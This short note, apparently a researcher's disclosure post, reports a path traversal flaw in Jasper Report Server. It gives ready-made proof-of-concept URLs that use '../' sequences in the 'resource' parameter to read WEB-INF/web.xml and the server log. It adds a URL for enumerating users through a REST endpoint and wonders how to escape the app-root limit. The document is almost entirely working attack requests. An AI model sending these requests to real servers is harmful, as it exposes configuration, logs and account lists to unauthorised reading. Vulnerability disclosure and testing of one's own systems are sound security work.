Path traversal in Jasper Report Server.
It won't allow to read much (limited to app root) but still. Maybe there is a way to escape it.

PoC:
https://jasperserver:443/jasperserver/reportresource/reportresource?resource=/net/sf/jasperreports/engine/json/parser/../../../../../../../../WEB-INF/web.xml
https://jasperserver:443/jasperserver/reportresource/reportresource?resource=/net/sf/jasperreports/engine/json/parser/../../../../../../../logs/jasperserver.log
etc.

User enumeration bonus:
https://jasperserver:443/jasperserver/runtime/74033D84/rest_v2/users 
Runtime ID may differ.
